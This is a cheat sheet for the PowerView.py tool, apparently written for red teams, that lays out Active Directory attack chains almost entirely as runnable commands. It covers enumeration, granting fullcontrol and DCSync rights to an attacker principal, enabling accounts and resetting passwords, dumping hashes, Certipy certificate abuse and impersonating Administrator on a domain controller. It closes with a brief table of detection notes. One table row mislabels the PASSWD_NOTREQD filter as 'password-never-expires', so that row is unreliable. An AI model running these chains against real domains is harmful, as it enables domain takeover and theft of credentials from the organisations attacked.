
# 🧠 PowerView.py Cheat Sheet  
_Active Directory Enumeration • Privilege Escalation • ACL Abuse (Python Edition)_

**Version:** October 2025  
**Author:** _YourName_  
**Tools:** [PowerView.py](https://github.com/aniqfakhrul/powerview.py) • Impacket • Certipy • Kerberos Utilities

---

## ⚙️ Quick Setup

```bash
git clone https://github.com/aniqfakhrul/powerview.py
cd powerview.py
python3 powerview.py -h
```

Use Kerberos tickets (preferred):

```bash
export KRB5CCNAME=$(pwd)/user.ccache
python3 powerview.py example.com/user@dc.example.com -k --dc-ip 10.10.10.10 --no-pass
```

---

## 🔍 1. Domain & Environment Enumeration

### Domain information
```bash
# Basic info about current domain
-q "Get-Domain"
# Cross‑domain trusts
-q "Get-DomainTrust"
# Domain controllers
-q "Get-DomainController"
```

### Forest interactions
```bash
-q "Get-Forest"
-q "Get-ForestDomain"
-q "Get-ForestTrust"
```

### LDAP object discovery
```bash
-q "Search -Filter '(objectClass=*)'"
-q "Search -Filter '(sAMAccountName=*)' -Attributes sAMAccountName,objectClass"
```

---

## 👩💻 2. User Enumeration

| Goal | Command |
|------|----------|
| List all users | `-q "Get-DomainUser"` |
| Specific user | `-q "Get-DomainUser -Identity 'j.smith'"` |
| Filter by title/description | `-q "Get-DomainUser | grep 'Manager'"` |
| Users without pre‑auth | `-q "Get-DomainUser -UACFILTER DONT_REQ_PREAUTH"` |
| Password‑never‑expires | `-q "Get-DomainUser -UACFILTER PASSWD_NOTREQD"` |

Example:
```bash
-q "Get-DomainUser -Identity 'a.doe' -Properties name,mail,title,info"
```

---

## 🖥️ 3. Machine & Computer Accounts

| Goal | Example |
|------|----------|
| List all computers | `-q "Get-DomainComputer"` |
| Filter by OS | `-q "Get-DomainComputer | grep 'Windows Server'"` |
| Include attributes | `-q 'Get-DomainComputer -Properties name,operatingSystem,servicePrincipalName'` |
| Unconstrained delegation | `-q "Get-DomainComputer -Unconstrained"` |
| Constrained delegation | `-q "Get-DomainComputer -AllowedToDelegate"` |

---

## 🧩 4. Group Enumeration

| Command | Purpose |
|----------|----------|
| `-q "Get-DomainGroup"` | List all groups |
| `-q "Get-DomainGroup -Identity 'Domain Admins'"` | Inspect one group |
| `-q "Get-DomainGroupMember -Identity 'IT Support'"` | View members |
| `-q "Get-DomainGroupMember -Recurse"` | Expand nested membership |
| `-q "Find-LocalAdminAccess"` | Identify who is admin where |

---

## 🔐 5. Access Control & ACLs

### Inspect ACLs
```bash
-q "Get-DomainObjectAcl -Identity 'OU=Finance,DC=example,DC=com' -ResolveGUIDs"
```

### Add custom ACEs (Full Control to a user/group)
```bash
-q "Add-DomainObjectAcl -TargetIdentity 'OU=Engineering,DC=example,DC=com' -PrincipalIdentity 'auditor' -Rights fullcontrol"
```

### Add inheritance
```bash
-q "Add-DomainObjectAcl -TargetIdentity 'OU=Engineering,DC=example,DC=com' -PrincipalIdentity 'auditor' -Rights fullcontrol -Inheritance"
```

**Supported Rights:**  
`fullcontrol, resetpassword, writemembers, dcsync, immutable`

---

## 🔧 6. Object Modification

| Operation | Command |
|------------|----------|
| Enable user | `-q "Set-DomainObject -Identity 'user1' -Set useraccountcontrol=512"` |
| Disable user | `-q "Set-DomainObject -Identity 'user1' -Set useraccountcontrol=514"` |
| Reset user password | `-q "Set-DomainUserPassword -Identity 'user1' -AccountPassword 'NewPass123!'"` |
| Modify general attribute | `-q "Set-DomainObject -Identity 'user1' -Set @{description='Red Team User'}"` |

---

## 🧠 7. Practical Privilege Chains (Red‑Team Patterns)

The following examples show common AD abuse techniques achievable solely via LDAP ACLs using PowerView.py.

---

### 🪪 a. User Enablement & Password Reset
1. Grant FullControl on an OU:
    ```bash
    -q "Add-DomainObjectAcl -TargetIdentity 'OU=Testing,DC=example,DC=com' \
        -PrincipalIdentity attacker -Rights fullcontrol -Inheritance"
    ```
2. Enable disabled accounts:
    ```bash
    -q "Set-DomainObject -Identity 'test.user' -Set useraccountcontrol=512"
    ```
3. Reset password:
    ```bash
    -q "Set-DomainUserPassword -Identity 'test.user' -AccountPassword 'Password123!'"
    ```

---

### 🔁 b. Group Control / Privilege Escalation
If an attacker controls a group that grants full control over an OU or user:

```bash
-q "Add-DomainObjectAcl -TargetIdentity 'OU=Resource,DC=example,DC=com' \
  -PrincipalIdentity 'IT Support' -Rights fullcontrol"
```

Now any member of **IT Support** can enable or reset accounts within that OU.

---

### 💣 c. DCSync Rights (replication privilege)

Grant replication rights needed for DCSync with `dcsync` flag:

```bash
-q "Add-DomainObjectAcl -TargetIdentity 'DC=example,DC=com' \
  -PrincipalIdentity attacker -Rights dcsync"
```

Then use Impacket `secretsdump.py` to retrieve password hashes.

---

## 🧾 8. TGT/TGS Integration Example  

Use Impacket when PowerView grants the necessary permission:

```bash
# Obtain a TGT after setting a password
getTGT.py -dc-ip 10.10.10.10 example.com/user1:Password123!
# Use Kerberos ticket for further LDAP/SMB access
export KRB5CCNAME=$(pwd)/user1.ccache
```

---

## 🪪 9. Certificate Abuse Integration (Certipy)

Once you identify vulnerable certificate templates:

```bash
certipy-ad find -k -vulnerable -dc-ip 10.10.10.10
certipy-ad req -k -upn user1@example.com -template VulnTemplate -dc-ip 10.10.10.10
certipy-ad auth -pfx user1.pfx -username user1 -domain example.com -dc-ip 10.10.10.10
```

---

## 🧰 10. Troubleshooting / Quality of Life

| Common Issue | Fix |
|---------------|-----|
| _insufficientAccessRights_ on an OU | Use inheritance or modify higher container ACL |
| _KDC_ERR_PREAUTH_FAILED_ | Password or hash is outdated; reset account again |
| _No output_ | Add `--debug` and verify Kerberos TGT validity |
| _Account not found_ | Confirm DN syntax and OU path in `TargetIdentity` |

---

## 🧠 11. Automation Tips

Create aliases or wrapper scripts:

```bash
alias pview='python3 /opt/powerview.py example.com/$(whoami)@dc.example.com -k --dc-ip 10.10.10.10 --no-pass -q'
```

Quick examples:

```bash
pview "Get-DomainUser -Identity admin"
pview "Get-DomainObjectAcl -Identity 'OU=Engineering,DC=example,DC=com' -ResolveGUIDs"
```

---

## 🧩 12. Post‑Exploit Extensions

Once a Kerberos chain completes (e.g., impersonation with a forged TGT):

```bash
getST.py -u2u -impersonate "Administrator" -spn "cifs/dc.example.com" \
  -k -no-pass 'example.com'/'serviceaccount$'
python3 evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.example.com
```

---

## 🛡️ 13. Blue‑Team / Detection Notes

| Suspicious Activity | PowerView Equivalent | Detection Strategy |
|----------------------|----------------------|--------------------|
| Unauthorized password reset | `Set-DomainUserPassword` | Account‑Management 4724 |
| OU ACL changes | `Add-DomainObjectAcl` | Directory‑Service Changes (4662) |
| Enumeration from non‑admin host | `Get-*` queries | LDAP query surge from workstation |
| FullControl assignments | `Rights=fullcontrol` | SIEM correlation of ACEs to unusual users |

---

## 🪄 14. Quick Reference Table

| Purpose | Command |
|----------|----------|
| Enumerate users | `Get-DomainUser` |
| Enumerate computers | `Get-DomainComputer` |
| List groups | `Get-DomainGroup` |
| Check memberships | `Get-DomainGroupMember` |
| Get ACLs | `Get-DomainObjectAcl -ResolveGUIDs` |
| Add ACL | `Add-DomainObjectAcl -Rights fullcontrol` |
| Modify attributes | `Set-DomainObject -Set @{attribute=value}` |
| Reset user password | `Set-DomainUserPassword` |
| Enable account | `Set-DomainObject -Set useraccountcontrol=512` |
| DCSync rights | `Add-DomainObjectAcl -Rights dcsync` |

---

## 📚 15. Recommended References

| Resource | Author |
|-----------|--------|
| PowerView.ps1 (original) | Will Schroeder @harmj0y |
| PowerView.py (Python port) | Aniq Fakhrul |
| AD Security Blog | Sean Metcalf |
| Certified Pre‑Owned research paper | SpecterOps |
| Certipy‑AD | Oliver Lyak @ly4k |
| Impacket | Fortra Red Team Tools |

---

##
##
